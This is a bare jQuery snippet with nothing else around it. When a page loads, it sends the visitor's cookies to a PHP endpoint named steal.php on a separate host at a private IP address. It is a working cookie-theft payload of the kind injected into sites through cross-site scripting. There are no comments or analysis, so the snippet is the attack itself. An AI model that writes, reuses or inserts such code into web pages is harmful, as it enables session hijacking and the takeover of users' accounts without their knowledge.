$(document).ready(function(){
    $.post("http://192.168.1.101:808/steal.php",{data:document.cookie});
});